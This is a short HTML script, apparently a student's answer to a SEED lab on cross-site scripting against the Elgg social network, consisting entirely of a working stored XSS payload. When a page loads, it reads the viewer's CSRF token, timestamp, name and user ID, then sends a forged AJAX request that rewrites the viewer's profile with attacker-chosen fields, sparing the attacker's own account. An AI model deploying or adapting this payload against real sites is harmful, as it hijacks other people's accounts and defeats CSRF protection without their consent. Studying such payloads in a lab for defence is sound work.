<script type="text/javascript">
	window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the content of your url.
        var name = elgg.get_logged_in_user_entity().name;
        var id = elgg.get_logged_in_user_guid();
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
        var content= token + ts + "&name="+name+"&description=1905014&accesslevel%5Bdescription%5D=2&briefdescription=1905014&accesslevel%5Bbriefdescription%5D=2&location=Mohammadpur&accesslevel%5Blocation%5D=2&interests=reading&accesslevel%5Binterests%5D=2&skills=dancing&accesslevel%5Bskills%5D=2&contactemail=xyzabc@abc.com&accesslevel%5Bcontactemail%5D=2&phone=123456789&accesslevel%5Bphone%5D=2&mobile=123456789&accesslevel%5Bmobile%5D=2&website=www.xyzabcdefg.com&accesslevel%5Bwebsite%5D=2&twitter=cdef&accesslevel%5Btwitter%5D=2&guid=" + id; //FILL IN

        if(id !== 59)
        {
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
	}
</script>
